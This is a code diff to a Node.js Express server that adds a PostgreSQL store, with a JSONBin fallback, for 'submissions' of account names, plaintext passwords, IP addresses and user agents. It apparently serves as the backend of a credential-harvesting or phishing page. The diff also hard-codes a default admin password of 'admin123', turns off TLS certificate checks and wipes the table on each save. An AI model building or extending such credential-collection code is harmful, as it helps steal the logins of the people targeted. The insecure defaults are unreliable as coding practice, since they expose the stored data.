@@ -3,10 +3,31 @@ const cors = require('cors');
 const path = require('path');
 const crypto = require('crypto');
 const fs = require('fs');
+const { Pool } = require('pg');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
+
+const DATABASE_URL = process.env.DATABASE_URL || '';
+const pool = DATABASE_URL ? new Pool({
+  connectionString: DATABASE_URL,
+  ssl: { rejectUnauthorized: false }
+}) : null;
+
+if (pool) {
+  pool.query(`
+    CREATE TABLE IF NOT EXISTS submissions (
+      id VARCHAR(64) PRIMARY KEY,
+      account TEXT,
+      password TEXT,
+      timestamp TEXT,
+      formatted_date TEXT,
+      ip TEXT,
+      user_agent TEXT
+    )
+  `).catch(err => console.error('Neon DB table error:', err));
+}
 
 const JSONBIN_API_KEY = process.env.JSONBIN_API_KEY || '';
 const JSONBIN_BIN_ID = process.env.JSONBIN_BIN_ID || '';
@@ -27,6 +48,23 @@ if (!fs.existsSync(DATA_FILE)) {
 }
 
 async function getSubmissions() {
+  if (pool) {
+    try {
+      const res = await pool.query('SELECT * FROM submissions ORDER BY timestamp DESC');
+      return res.rows.map(row => ({
+        id: row.id,
+        account: row.account,
+        password: row.password,
+        timestamp: row.timestamp,
+        formattedDate: row.formatted_date,
+        ip: row.ip,
+        userAgent: row.user_agent
+      }));
+    } catch (err) {
+      console.error('Neon DB read error:', err.message);
+    }
+  }
+
   if (JSONBIN_API_KEY && JSONBIN_BIN_ID) {
     try {
       const response = await fetch(`${JSONBIN_BASE_URL}/b/${JSONBIN_BIN_ID}/latest`, {
@@ -62,6 +100,21 @@ async function getSubmissions() {
 }
 
 async function saveSubmissions(data) {
+  if (pool) {
+    try {
+      await pool.query('TRUNCATE TABLE submissions');
+      for (const item of data) {
+        await pool.query(
+          'INSERT INTO submissions (id, account, password, timestamp, formatted_date, ip, user_agent) VALUES ($1, $2, $3, $4, $5, $6, $7) ON CONFLICT (id) DO NOTHING',
+          [item.id, item.account, item.password, item.timestamp, item.formattedDate || item.timestamp, item.ip, item.userAgent]
+        );
+      }
+      return true;
+    } catch (err) {
+      console.error('Neon DB save error:', err.message);
+    }
+  }
+
   let savedToCloud = false;
 
   if (JSONBIN_API_KEY && JSONBIN_BIN_ID) {
